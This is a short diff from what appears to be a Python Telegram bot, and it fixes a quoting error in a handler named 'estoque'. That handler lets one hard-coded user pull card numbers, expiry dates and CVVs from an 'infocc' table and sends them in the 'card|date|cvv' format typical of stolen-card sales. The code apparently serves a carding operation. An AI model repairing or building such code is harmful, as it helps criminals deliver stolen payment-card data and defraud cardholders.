@@ -162,7 +162,7 @@ def estoque(message):
   if message.from_user.id == 1869219363:
     cursor.execute("SELECT cartao, data, cvv FROM infocc")
     cartao, data, cvv = cursor.fetchall()
-    bot.send_message(message.chat.id, f"{cartao}|{data}|{cvv}")"
+    bot.send_message(message.chat.id, f"""{cartao}|{data}|{cvv}""")
 
 @bot.message_handler(content_types=['photo'])
 def photo(message):
